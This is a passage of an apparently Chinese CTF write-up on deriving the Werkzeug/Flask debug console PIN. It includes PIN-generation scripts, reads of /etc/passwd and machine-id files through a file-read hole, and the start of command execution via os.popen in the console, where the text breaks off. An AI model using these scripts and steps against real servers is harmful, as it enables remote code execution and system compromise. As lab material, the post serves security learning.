punctuation">.</span>evalex            <span class="token keyword">and</span> self<span class="token punctuation">.</span>console_path <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>            <span class="token keyword">and</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> self<span class="token punctuation">.</span>console_path        <span class="token punctuation">)</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> self<span class="token punctuation">.</span>display_console<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>        <span class="token keyword">return</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成要素：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1.flask所登录的用户名username通过getpass.getuser()读取，通过文件读取/etc/passwdlinux可以查看/etc/passwdwindows可以查看C:/Users目录2.modnamemodname通过getattr(mod,“file”,None)读取，默认值为flask.app3.getattr(app, “name”, app.class.name)appname通过getattr(app,“name”,type(app).name)读取，默认值为Flask4.flask库下app.py的绝对路径moddir当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取通常报错信息会提示File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2463, in __call__得到：/usr/local/lib/python3.7/site-packages/flask/app.py5.当前网络的mac地址的十进制数uuidnode通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算6.docker机器idmachine_id每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个，非docker要读三个不加任何字符的直接拼接)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup  (docker/后面的字符串)#有时单独/proc/self/cgroup#有时/proc/sys/kernel/random/boot_id+/proc/self/cgroup#有时/etc/machine-id+/proc/self/cgroup如果存在/etc/machine-id：/etc/machine-id+/proc/self/cgroup如果不存在/etc/machine-id，存在/proc/sys/kernel/random/boot_id：/proc/sys/kernel/random/boot_id+/proc/self/cgroup如果两个都不存在 /proc/self/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里最容易出错的是machine_id</p><p>根据源码（#有个break）可以看出来</p><p>python3.8的machine-id是从</p><p>&#x2F;etc&#x2F;machine-id </p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p><p>&#x2F;proc&#x2F;self&#x2F;cgroup</p><p>规则是（python3.8不同版本可能规则不一样 算法路径：<code>/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py</code>）</p><p>如果存在&#x2F;etc&#x2F;machine-id：&#x2F;etc&#x2F;machine-id+&#x2F;proc&#x2F;self&#x2F;cgroup</p><p>如果不存在&#x2F;etc&#x2F;machine-id，存在&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id：&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id+&#x2F;proc&#x2F;self&#x2F;cgroup</p><p>如果两个都不存在 &#x2F;proc&#x2F;self&#x2F;cgroup</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> value<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> value                <span class="token keyword">break</span> <span class="token comment">#有个break</span>        <span class="token comment"># Containers share the same machine id, add some cgroup</span>        <span class="token comment"># information. This is used outside containers too but should be</span>        <span class="token comment"># relatively stable across boots.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>            <span class="token keyword">return</span> linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当这6个值我们可以获取到时，就可以推算出生成的PIN码</p><h2 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h2><p> 3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同 </p><p>3.6</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'flaskweb'</span>     <span class="token string">'flask.app'</span><span class="token punctuation">,</span>     <span class="token string">'Flask'</span><span class="token punctuation">,</span>     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span>     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.8</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span>    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/images/image-20220912235526327.png" alt="image-20220912235526327"></p><p><img src="/images/image-20220912235550521.png" alt="image-20220912235550521">果然有报错信息</p><h3 id="1-flask所登录的用户名（-x2F-etc-x2F-passwd）"><a href="#1-flask所登录的用户名（-x2F-etc-x2F-passwd）" class="headerlink" title="1.flask所登录的用户名（&#x2F;etc&#x2F;passwd）"></a>1.flask所登录的用户名（&#x2F;etc&#x2F;passwd）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>如果没有和比赛有关的名字(自定义用户名)，一般就是root</strong></p><h3 id="2-modname"><a href="#2-modname" class="headerlink" title="2.modname"></a>2.modname</h3><p>flask.app</p><h3 id="3-appname"><a href="#3-appname" class="headerlink" title="3.appname"></a>3.appname</h3><p>Flask</p><h3 id="4-moddir"><a href="#4-moddir" class="headerlink" title="4.moddir"></a>4.moddir</h3><p><img src="/images/image-20220913000552141.png" alt="image-20220913000552141"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/usr/local/lib/python3.8/site-packages/flask/app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-mac地址的十进制数-x2F-sys-x2F-class-x2F-net-x2F-eth0-x2F-address"><a href="#5-mac地址的十进制数-x2F-sys-x2F-class-x2F-net-x2F-eth0-x2F-address" class="headerlink" title="5.mac地址的十进制数(&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)"></a>5.mac地址的十进制数(&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</h3><p><img src="/images/image-20220913000724133.png" alt="image-20220913000724133"></p><p> 02:42:ac:0c:a9:36 &#x3D;&gt;10进制&#x3D;&gt; 2485377607990</p><h3 id="6-docker机器id"><a href="#6-docker机器id" class="headerlink" title="6.docker机器id"></a>6.docker机器id</h3><p> <strong>旧版(3.6)的只需要读取&#x2F;proc&#x2F;self&#x2F;cgroup即可，但是新增(3.8)需要在前面再拼上&#x2F;etc&#x2F;machine-id或者&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id的值</strong> </p><p>&#x2F;etc&#x2F;machine-id</p><p>无</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p><p><img src="/images/image-20220913003446721.png" alt="image-20220913003446721"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">8f95c377-0690-4c28-aa82-8303645d4459<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&#x2F;proc&#x2F;self&#x2F;cgroup</p><p><img src="/images/image-20220913003513693.png" alt="image-20220913003513693"></p><p>machine_id 每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中<strong>第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id</strong>，在docker环境下读取后两个，非docker环境三个都需要读取</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">39ee382b02a28a5b64c1b862ce8d30f08b4d2b97f36712d55dc6418403c185c3  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>docker机3.8版本需要 (&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id) +&#x2F;proc&#x2F;self&#x2F;cgroup</p><p>最终机器id</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">8f95c377-0690-4c28-aa82-8303645d445939ee382b02a28a5b64c1b862ce8d30f08b4d2b97f36712d55dc6418403c185c3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377607990'</span><span class="token punctuation">,</span>    <span class="token string">'8f95c377-0690-4c28-aa82-8303645d445939ee382b02a28a5b64c1b862ce8d30f08b4d2b97f36712d55dc6418403c185c3'</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>算出pin后</p><p> 点击调试窗口 按照python命令执行操作</p><p><img src="/images/202204150034580221_14.png" alt="在这里插入图片描述"></p><p>一般禁用了system</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> <span class="token function">import</span> os<span class="token operator">>></span><span class="token operator">></span> os.popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>os._wrap_close object at 0x7f798eaa79a<span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token operator">>></span><span class="token operator">></span> os.popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>.read<span 